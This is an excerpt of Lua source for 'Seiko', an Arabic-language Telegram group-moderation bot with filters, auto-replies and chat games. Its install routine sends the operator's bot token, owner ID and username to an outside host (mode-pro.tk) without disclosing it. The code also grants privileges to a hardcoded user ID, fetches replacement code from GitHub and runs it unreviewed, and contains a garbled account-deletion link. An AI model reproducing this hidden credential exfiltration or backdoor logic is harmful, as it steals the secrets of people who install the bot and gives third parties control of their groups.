...
https.request('http://mode-pro.tk/Seiko/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("Seiko", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/Seiko
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./Seiko.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("SKO", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S Seiko -X kill
screen -S Seiko ./Seiko
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Seiko-TEAM/Files_Seiko/main/File_Bot/commands.lua") 
...
if tonumber(user_id) == tonumber(1420961234) then  
var = true  
...
local UserName = (data.username_ or "llllrc")
...
local Seiko_Msg = ''  
if msgs < 100 then 
Seiko_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
Seiko_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
Seiko_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
Seiko_Msg = 'متفاعل' 
elseif msgs < 1200 then 
Seiko_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
Seiko_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
Seiko_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
Seiko_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
Seiko_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
Seiko_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
Seiko_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
Seiko_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
Seiko_Msg = 'رب التفاعل'  
end 
return Seiko_Msg 
end
...
function plugin_Seiko(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Seiko and msg then
pre_msg = plugin.Seiko(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceSeiko(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,Seiko_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf Seiko.lua')
os.execute('wget https://raw.githubusercontent.com/llllrc/Seiko/main/Seiko.lua')
send(msg.chat_id_, msg.id_,' ꙳.︙تم تحديث السورس \n ꙳.︙لديك اخر اصدار لسورس سايكو\n ꙳.︙الاصدار » { v 1.6 }')
dofile('Seiko.lua')  
end
if text == 'الاصدار ꙳.' and Devmode(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ꙳.︙اصدار سورس سايكو \n ꙳.︙الاصدار »{ v 1.6 }')
end
...
-------------
if text == "꙳. تحديثات سورس سايكو ꙳." and Devmode(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس سايكو*
...
send(msg.chat_id_, msg.id_,'꙳.︙عدد الكروبات الان » { '..#group..' }'..Seikok..''..Seiko..'\n꙳.︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ꙳.︙العضو » ['..result.title_..'](t.me/'..(username or 'llllrc')..')'
status  = '\n ꙳.︙تم ترقيته مطور'
...
usertext = '\n ꙳.︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'llllrc')..')'
status  = '\n ꙳.︙تم ترقيته مطور'
...
local Seiko1_Msg = database:get(bot_id.."Seiko1:Add:Filter:Rp2"..text..msg.chat_id_)   
if Seiko1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꙳.︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'llllrc')..') \n ꙳.︙'..Seiko1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if Seiko_Msg and not Special(msg) then  
local Seiko_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Seiko_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ꙳.︙["..Seiko_Msg.."] \n")
else
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/llllrc)}\n ꙳.︙["..Seiko_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ꙳.︙عذرا » {["..data.first_name_.."](T.ME/llllrc)}\n ꙳.︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."Seiko:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."Seiko:blocname"..msg.chat_id_)
...
if name_MRmode then 
names_MRmode = database:smembers(bot_id.."Seiko:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."Seiko:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."Seiko:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."Seiko:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."Seiko:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."Seiko:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function mode_mrmode_new(mrmode1,mrmode2)
if mrmode2 and mrmode2.first_name_ then 
if mrmode2.first_name_:match("(.*)"..database:get(bot_id.."Seiko:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."Seiko:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrmode_nnn = database:get(bot_id.."Seiko:nump"..msg.chat_id_) or 5
local mrmode_nnn2 = database:get(bot_id.."Seiko:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrmode_nnn2) == tonumber(mrmode_nnn) or tonumber(mrmode_nnn2) > tonumber(mrmode_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."Seiko:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "꙳.︙عزيزي >>["..mrmode2.username_.."](https://t.me/"..(mrmode2.username_ or "llllrc")..")\n꙳.︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."Seiko:teh"..msg.chat_id_).."} بجانب اسمك\n꙳.︙عدد المحاولات المتبقيه {"..(tonumber(mrmode_nnn) - tonumber(mrmode_nnn2)).."}")
end
end
end
end
...
local SeikoChengName = database:get(bot_id.."Seiko:Cheng:Name"..data.id_)
if not data.first_name_ then 
if SeikoChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..SeikoChengName..']')
database:del(bot_id.."Seiko:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if SeikoChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."Seiko:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local SeikoChengUserName = database:get(bot_id.."Seiko:Cheng:UserName"..data.id_)
if not data.username_ then 
if SeikoChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..SeikoChengUserName..']')
database:del(bot_id.."Seiko:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if SeikoChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."Seiko:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local SeikoChengPhoto = database:get(bot_id.."Seiko:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if SeikoChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."Seiko:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if SeikoChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."Seiko:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
Text = "𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 ˹𝗦𝙚𝙞𝘬𝐎 \n\n[˹𝗦𝙚𝙞𝘬𝐎 ᴛᴇᴀ𝗠 ](http://t.me/llllrc)\n\n[𝙏𝙬𝙎 𝙎𝙤𝙪𝙧𝙘𝙚 ](http://t.me/Ssko90bot)"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝘿𝙚𝙫 ˹𝗦𝙚𝙞𝘬𝐎  .',url="https://t.me/A2HHHH"}},
}
local msg_id = msg.id_/2097152/0.5
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ꙳.︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'llllrc')..') \n ꙳.︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꙳.︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'llllrc')..') \n ꙳.︙تـم قفـل التاك بالكتم ')
end,nil)   
...
local UserName = (b.username_ or "Seiko-TEAM")
...
function Function_Seiko(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Seiko, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Seiko, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ꙳.︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'llllrc')..')'
status  = '\n ꙳.︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ꙳.︙العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꙳.︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'llllrc')..')'
...
database:set(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ꙳.︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Seiko1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Seiko1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ꙳.︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Seiko1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Seiko1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Seiko1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ꙳.︙ارسل الكلمه الان")  
database:set(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Seiko1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Seiko1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."Seiko1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Seiko1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Seiko1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Seiko1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ꙳.︙قائمة المنع \n⋆ ┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉ ⋆\n"
for k,v in pairs(list) do  
local Seiko_Msg = database:get(bot_id.."Seiko1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..Seiko_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ꙳.︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'llllrc')..')'..'\n ꙳.︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'سايكو').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'سايكو')
local Seiko_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..Seiko_Msg[math.random(#Seiko_Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ꙳.︙ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:Seiko:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:Seiko:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:Seiko:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"꙳.︙تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:Seiko:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:Seiko:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:Seiko:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:Seiko:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:Seiko:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:Seiko:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:Seiko:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:Seiko:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:Seiko:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:Seiko:List:Rd:Sudo")
end
...
database:set(bot_id.."llllrc:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'꙳. تم تفعيل الانستا')
database:set(bot_id.."llllrc:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."llllrc:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."llllrc:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"꙳.︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."llllrc:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."llllrc:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس سايكو يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:Seiko:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"꙳.︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:Seiko:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Seiko:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:Seiko:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Seiko:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:Seiko:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:Seiko:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:Seiko:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:Seiko:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:Seiko:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:Seiko:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سايكو').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'llllrc')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
Seikodx(msg.chat_id_, msg.id_, ' ꙳.︙ايدي المجموعة » ( '..msg.chat_id_..' )\n ꙳.︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ꙳.︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n ꙳.︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📆📅📆📆')
send(msg.chat_id_, msg.id_,' ⌁ 🕷️اسرع واحد يدز الاختلاف ↺ {'..name..'}')
return false
end
end
------------------------------------------------------------------------
...
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
Seiko = {'22','30','33','60','90','2','5','36','16','88','50','10','19',};
name = Seiko[math.random(#Seiko)]
...
if database:get(bot_id..'Lock:Games'..msg.chat_id_) then
Seiko = {'معلومات','قنوات','مجموعات','كتاب','تفاحه','مختلف','سدني','فلوس','اعلم','ذئب','تمساح','ذكي',};
name = Seiko[math.random(#Seiko)]
...
━═━═━═━═━═━═━═━═━━═━═━═━
 ⌁ 🕷️ لعبه البات ⌁ 🕷️ - لعبة المحيبس 
 ⌁ 🕷️ لعبه التخمين ⌁ 🕷️ - لعبة البحث
 ⌁ 🕷️ لعبه الاسرع ⌁ 🕷️ - لعبة اسرع شخص
 ⌁ 🕷️ لعبه السمايلات ⌁ 🕷️ - لعبة المطابقه 
 ⌁ 🕷️ لعبه المختلف ⌁ 🕷️ - لعبة الذكاء
 ⌁ 🕷️ لعبه الرياضيات ⌁ 🕷️ - لعبة الارقام
 ⌁ 🕷️ لعبه الانكليزي ⌁ 🕷️ - لعبة ترجمه
 ⌁ 🕷️ لعبه الامثله ⌁ 🕷️ - لعبة تصحيح 
 ⌁ 🕷️ لعبه العكس ⌁ 🕷️ - لعبة عكس الكلمات
 ⌁ 🕷️ لعبه الحزوره ⌁ 🕷️ -لعبة التفكير 
 ⌁ 🕷️ لعبه المعاني ⌁ 🕷️ - العبه الشهيره 
━═━═━═━═━═━═━═━═━━═━═━═━
↺ .[˹𝗦𝙚𝙞𝘬𝐎 ᴛᴇᴀ𝗠](t.me/llllrc)-
]]
...
≪─━─━─𝙎𝙉━─━─≫
 ...
 ꙳. رابط حذف [Snspchat](https://accounts.Seikochat.com/accounts/login?continue=https%3A%2F%2Faccounts.Seikochat.com%2Faccounts%2Fdeleteaccount) ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سايكو')
...
Seiko = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Seiko)
...
--------------------------------------------------------------------------------------------------------------
SourceSeiko(data.message_,data)
plugin_Seiko(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local SeikoAbot = database:get(bot_id.."Seiko1:Add:Filter:Rp2"..text..result.chat_id_)   
if SeikoAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ꙳.︙["..SeikoAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local Seiko1_Msg = database:get(bot_id.."Seiko1:Add:Filter:Rp2"..text..result.chat_id_)   
if Seiko1_Msg then    
send(msg.chat_id_, msg.id_," ꙳.︙"..Seiko1_Msg)
